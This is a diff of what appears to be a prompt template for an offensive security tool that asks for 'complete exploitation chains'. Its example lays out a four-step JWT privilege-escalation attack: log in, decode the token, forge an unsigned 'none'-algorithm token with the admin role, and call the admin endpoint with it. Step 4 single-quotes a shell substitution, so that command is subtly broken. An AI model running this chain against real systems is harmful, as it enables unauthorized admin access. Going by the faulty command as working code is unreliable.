@@ -242,20 +242,20 @@ Return JSON with complete exploitation chains:
       "actionable_step": "The application uses JWT with weak algorithm verification. We can forge tokens with 'none' algorithm to escalate privileges.",
       "pocs": [
         {
-          "description": "Step 1: Authenticate and extract JWT token",
-          "command": "curl -s -X POST http://target/api/login -d '{\"username\":\"testuser\",\"password\":\"pass123\"}' | jq -r '.token' > /tmp/token.txt && cat /tmp/token.txt"
+          "comment": "Step 1: Authenticate and extract JWT token",
+          "payload": "curl -s -X POST http://target/api/login -d '{\"username\":\"testuser\",\"password\":\"pass123\"}' | jq -r '.token' > /tmp/token.txt && cat /tmp/token.txt"
         },
         {
-          "description": "Step 2: Decode token to inspect structure",
-          "command": "export TOKEN=$(cat /tmp/token.txt) && echo $TOKEN | cut -d. -f2 | base64 -d | jq"
+          "comment": "Step 2: Decode token to inspect structure",
+          "payload": "export TOKEN=$(cat /tmp/token.txt) && echo $TOKEN | cut -d. -f2 | base64 -d | jq"
         },
         {
-          "description": "Step 3: Forge new token with 'none' algorithm and admin role",
-          "command": "echo '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64 | tr -d '=' > /tmp/header.txt && echo '{\"role\":\"admin\",\"sub\":\"attacker\"}' | base64 | tr -d '=' > /tmp/payload.txt && cat /tmp/header.txt /tmp/payload.txt | sed 's/$/./' | tr -d '\\n' > /tmp/forged.txt"
+          "comment": "Step 3: Forge new token with 'none' algorithm and admin role",
+          "payload": "echo '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64 | tr -d '=' > /tmp/header.txt && echo '{\"role\":\"admin\",\"sub\":\"attacker\"}' | base64 | tr -d '=' > /tmp/payload.txt && cat /tmp/header.txt /tmp/payload.txt | sed 's/$/./' | tr -d '\\n' > /tmp/forged.txt"
         },
         {
-          "description": "Step 4: Access admin endpoint with forged token",
-          "command": "curl -H 'Authorization: Bearer $(cat /tmp/forged.txt)' http://target/api/admin"
+          "comment": "Step 4: Access admin endpoint with forged token",
+          "payload": "curl -H 'Authorization: Bearer $(cat /tmp/forged.txt)' http://target/api/admin"
         }
       ]
     }
